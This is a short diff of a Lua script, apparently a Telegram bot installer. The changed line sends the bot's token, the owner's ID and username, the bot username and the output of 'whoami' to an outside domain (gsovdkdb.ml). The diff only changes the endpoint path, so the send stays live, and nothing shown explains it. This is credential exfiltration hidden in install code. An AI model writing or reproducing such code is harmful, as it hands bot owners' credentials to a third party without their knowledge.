@@ -73,7 +73,7 @@ token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 UserName = database:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://gsovdkdb.ml/fireawn/index.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
+https.request('https://gsovdkdb.ml/api/frawn.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BANDA", "w")  
 file:write([[
